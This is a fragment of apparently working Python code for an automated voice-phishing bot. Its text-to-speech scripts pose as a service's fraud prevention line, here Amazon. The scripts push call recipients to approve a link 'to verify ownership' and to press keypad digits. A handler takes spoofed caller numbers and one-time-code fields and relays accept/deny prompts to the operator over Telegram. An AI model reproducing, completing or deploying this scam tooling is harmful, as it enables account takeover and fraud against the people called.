...
# TTS Payloads
PAYLOAD_START_CALL = "Hello {name}, this is the {service} fraud prevention line. We have sent this automated call because of an attempt to change the phone number on your {service} account. If this was not you, please press 1."
PAYLOAD_DTMF_ONE = "In order to block this request, please approve a link, that we have just sent to your mobile device. This is to verify ownership of your account. Once completed please dial 2."
PAYLOAD_THANKS = "Thank you for your assistance. Please wait a second while we check your request."

PRESSDTMF_SLEEP_DURATION = 40
HANGUP_SLEEP_DURATION = 120
DELETE_DATA_SLEEP_DURATION = 300

# LINK APPROVAL VOUCH MESSAGE

async def amazon(data: dict, module: str, call_variables: str, event: str, channel_id: str, number: str, spoof: str, service: str, name: str, otpdigits: str, chatid: str, tag: str):
    if event == "Dial":
        ...
        if info['dtmf_status'] == "waiting_for_one":
            ...
            if digit == "2":
                ...
                # SEND TG ACCEPT/DENY
                payload_2 = PAYLOAD_DTMF_ONE.format(**locals())
                await send_accept_deny(chatid, payload_2, call_variables, otpdigits, f"🔗 Link has been approved!", channel_id)
